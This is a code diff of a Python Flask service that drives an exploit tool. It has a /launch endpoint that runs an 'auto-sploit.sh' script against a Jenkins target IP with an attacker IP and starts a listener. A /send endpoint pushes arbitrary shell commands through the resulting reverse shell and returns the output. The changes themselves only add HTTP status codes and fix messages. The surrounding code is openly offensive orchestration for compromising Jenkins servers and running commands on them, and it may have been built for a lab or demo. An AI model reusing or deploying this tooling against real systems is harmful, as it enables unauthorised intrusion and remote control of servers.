@@ -48,7 +48,7 @@ logger.addHandler(ch)
 
 @app.route("/")
 def hello():
-    return "Good Day!"
+    return "Happy Hacking!", 200
 
 
 @app.route("/launch", methods=['POST'])
@@ -79,11 +79,11 @@ def launch_sploit():
         if target_ip == "" or attacker_ip == "":
             logger.error('Payload is all wrong!')
             logger.error(payload)
-            return 'ERROR'
+            return 'ERROR - Invalid Payload', 400
 
         exe = '/root/auto-sploit.sh'
         if not os.path.exists(exe):
-            return 500, 'launch script does not exist'
+            return 'launch script does not exist', 500
 
         logger.info('Launching auto-sploit.sh')
         child = pexpect.spawn('/root/auto-sploit.sh')
@@ -94,14 +94,14 @@ def launch_sploit():
             _launch_listener()
             child.send('\n')
         else:
-            return 'ERROR - Could not press key to continue'
+            return 'ERROR - Could not launch exploit tool', 500
 
         found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
             logger.info('Sending attacker ip :::' + attacker_ip + ':::')
             child.sendline(attacker_ip)
         else:
-            return 'ERROR - Could not enter attacker IP'
+            return 'ERROR - Could not enter attacker IP', 500
 
         found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
@@ -110,17 +110,17 @@ def launch_sploit():
             child.sendline(target_ip)
         else:
             logger.error(child.before)
-            return 'ERROR - Could not enter jenkins IP'
+            return 'ERROR - Could not enter jenkins IP', 500
 
         found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
         if found_index == 0:
             logger.info('PWN')
             logger.debug(child)
             time.sleep(2)
-            return 'SUCCESS - auto-sploit launched!'
+            return 'SUCCESS - auto-sploit launched!', 200
 
     else:
-        return 'No Bueno - No JSON payload detected'
+        return 'No Bueno - No JSON payload detected', 400
 
 
 @app.route("/send", methods=['POST'])
@@ -129,13 +129,13 @@ def send_cmd():
         data = request.get_json()
         cli = data.get('cli', '')
         if cli == '':
-            return 'No Bueno - Invalid JSON payload'
+            return 'No Bueno - Invalid JSON payload', 400
 
         if 'listener' in app.config:
             logger.info('We have a listener already up!')
             listener = app.config.get('listener', '')
             if not hasattr(listener, 'isalive') or not listener.isalive():
-                return 'No Bueno - Listener does not appear to be active'
+                return 'No Bueno - Listener does not appear to be active', 400
 
             logger.info('Sending initial command to see where we are!')
             listener.sendline('echo $SHLVL\n')
@@ -148,7 +148,7 @@ def send_cmd():
 
             if found_index > 2:
                 logger.error(listener.before)
-                return 'Someting is wrong with the listener connection!'
+                return 'Something is wrong with the listener connection!', 500
 
             # listener.sendline(cli)
             # logger.debug(listener)
@@ -156,20 +156,20 @@ def send_cmd():
             logger.debug('Found index is now: ' + str(found_index))
             if found_index > 1:
                 logger.error(listener)
-                return 'Someting is wrong with the listener connection!'
+                return 'Something is wrong with the listener connection!', 500
             listener.sendline(cli)
             found_index = listener.expect(['jenkins@.*$', 'root@.*#', pexpect.EOF, pexpect.TIMEOUT])
             logger.debug('Found index after cli is now: ' + str(found_index))
             if found_index > 1:
                 logger.error(listener)
-                return 'Someting is wrong with the listener connection!'
+                return 'Something is wrong with the listener connection!', 500
             logger.debug(listener)
             return listener.before
 
         else:
-            return 'NOPE'
+            return 'Exploit is not currently active, ensure you have launched the exploit first!', 400
     else:
-        return 'NOWAYJOSE'
+        return 'Invalid Payload for send command', 400
 
 
 def _launch_listener():
